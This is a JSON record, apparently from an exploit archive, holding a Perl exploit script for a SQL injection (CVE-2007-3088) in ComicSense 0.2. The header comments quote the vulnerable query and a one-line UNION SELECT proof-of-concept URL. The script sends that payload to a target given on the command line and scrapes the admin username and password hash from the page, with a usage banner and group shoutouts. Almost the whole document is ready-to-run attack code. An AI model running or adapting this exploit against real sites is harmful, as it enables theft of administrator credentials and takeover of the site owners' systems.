{
  "id": "4037",
  "title": "Comicsense 0.2 - &#039;index.php?epi&#039; SQL Injection (2)",
  "cve": "CVE-2007-3088",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t\t  \tComicSense 0.2 SQL Injection Exploit   \t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: s0cratex\t\t\t\t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval\t\t\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Original Advisory: http://seclists.org/bugtraq/2007/Jun/0063.html\t\t#\r\n#\t\t     http://milw0rm.com/exploits/4035\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (index.php): \t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#      $sqlQuery = \"SELECT * FROM \" . $prefix . \"comic WHERE episodenr = $epi\"; #\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: http://victim.com/index.php?epi=-999 UNION SELECT username,0,password \t#\r\n#      FROM users LIMIT 1\t\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: Nothing\t\t\t\t\t\t\t\t#\r\n# GoogleDork: Get your own!\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community & s0cratex\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\nif (@ARGV < 1){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"               \t ComicSense 0.2 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_comicsense.pl [PATH]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where ComicSense is located\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_comicsense.pl http://victim.com/comic/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n\r\n$host = $ARGV[0] . \"index.php?epi=-999 UNION SELECT username,0,password FROM users LIMIT 1\";\r\n\r\n$res = $b->request(HTTP::Request->new(GET=>$host));\r\n$res->content =~ /.jpg\" alt=\"#(.*?):/;\r\n\r\n  ($user) = $res->content =~ /.jpg\" alt=\"#(.*?):/;\r\n  ($hash) = $res->content =~ /: ([0-9a-fA-F]{32})\" \\/>/;\r\n\r\nif($user && $hash){\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"               \t ComicSense 0.2 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"[+] Admin User : $user\\n\";\r\nprint \"[+] Admin Hash : $hash\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n} else {\r\n  print \"\\nExploit Failed...\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-06-06]",
  "url": "https://www.exploit-db.com/exploits/4037"
}